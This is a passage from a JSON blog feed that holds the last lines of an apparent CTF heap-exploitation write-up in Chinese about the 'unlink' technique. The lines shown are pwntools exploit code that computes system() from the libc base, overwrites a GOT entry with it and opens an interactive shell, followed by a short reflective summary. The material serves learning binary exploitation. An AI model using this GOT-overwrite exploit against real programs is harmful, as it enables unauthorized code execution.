data-num=\"87\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"libc_addr:%x\"</span><span class=\"token punctuation\">,</span>libc_base<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>system_addr<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"system_addr:%x\"</span><span class=\"token punctuation\">,</span>system_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>system_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#改写 got 表内容</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/unlinkpic/image-20230811135415349.png\" alt=\"image-20230811135415349\"></p>\n<h3 id=\"总结\"><a class=\"markdownIt-Anchor\" href=\"#总结\">#</a> 总结：</h3>\n<p>unlink 这里比较的绕，其实不难，但是是去理解指针的指向需要花费一点时间，现在还是不太熟练，要继续加油。</p>\n",
            "tags": [
                "堆",
                "unlink"
            ]
        }
    ]
}